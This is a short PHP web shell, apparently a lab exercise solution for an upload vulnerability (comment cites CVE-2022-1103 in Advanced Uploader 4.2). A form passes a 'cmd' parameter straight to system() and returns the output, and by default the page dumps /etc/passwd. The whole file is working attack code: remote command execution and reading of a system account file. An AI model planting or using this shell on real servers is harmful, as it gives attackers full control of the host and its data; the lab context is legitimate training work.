<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="text" name="cmd" autofocus id="cmd" size="80">
<input type="submit" value="Execute">
</form>
<pre>
<?php
// 5.6 - web shell (CVE-2022-1103, Advanced Uploader 4.2)
if (isset($_GET['cmd'])) {
    system($_GET['cmd'] . ' 2>&1');
} else {
    // domyslnie pokaz /etc/passwd (odpowiedz do 5.6 d)
    echo htmlspecialchars(file_get_contents('/etc/passwd'));
}
?>
</pre>
</body>
</html>
